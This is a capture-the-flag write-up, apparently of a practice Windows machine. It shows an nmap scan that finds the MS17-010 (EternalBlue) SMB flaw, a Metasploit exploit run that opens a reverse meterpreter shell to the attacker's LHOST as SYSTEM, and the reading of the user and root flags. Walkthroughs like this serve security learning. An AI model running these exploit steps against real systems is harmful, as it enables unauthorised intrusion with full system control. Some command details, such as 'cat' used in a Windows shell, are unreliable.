I do a fast `nmap` search:

```
nmap -p- --min-rate 1000 {target ip}
```

I see there is an smb service on port 445, and use `nmap` `vuln` scripts to see if there are any vulnerabilities in smb, and I am able to find a big one, called MS-17-010

```
oxdf@parrot$ nmap -p 445 -script vuln -oA scans/nmap-smbvulns 10.10.10.40 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:17 EDT Nmap scan report for 10.10.10.40 Host is up (0.019s latency). 
PORT STATE SERVICE 
445/tcp open microsoft-ds 
Host script results: 
|_smb-vuln-ms10-054: false 
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND 
| smb-vuln-ms17-010: 
| VULNERABLE: 
| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
| State: VULNERABLE 
| IDs: CVE:CVE-2017-0143 
| Risk factor: HIGH 
| A critical remote code execution vulnerability exists in Microsoft SMBv1 
| servers (ms17-010). 
| 
| Disclosure date: 2017-03-14 
| References: 
| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 
|_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
```

MS-17-010, known as `ETERNALBLUE` is an unauthenticated remote code execution vulnerability in Windows SMB most famous for it's leak by Shadow Brokers and the WannaCry worm in 2017.

There are several exploits available on the web, but I will be using Metasploit.

```
$ msfconsole

msf6 > search ms17-010 
Matching Modules ================ 
# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 
0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 

1 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 

2 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 

3 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 

4 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 

5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution

msf6 > use 0

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40 
RHOSTS => 10.10.10.40 
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.14 
lhost => 10.10.14.14

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

So that works! This exploit works just by setting RHOSTS and LHOST.

```
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell

C:\Windows\system32>
```

I found a flag for the user in `/haris/destop/user.txt` and found a flag for the administrator in `/administrator/desktop/root.txt`. I was able to enumerate the system using the command `cd` and was able to print the flags using `cat`. I had some issues using the following commands `pwd, type, whoami, echo, powershell, and net user`. 

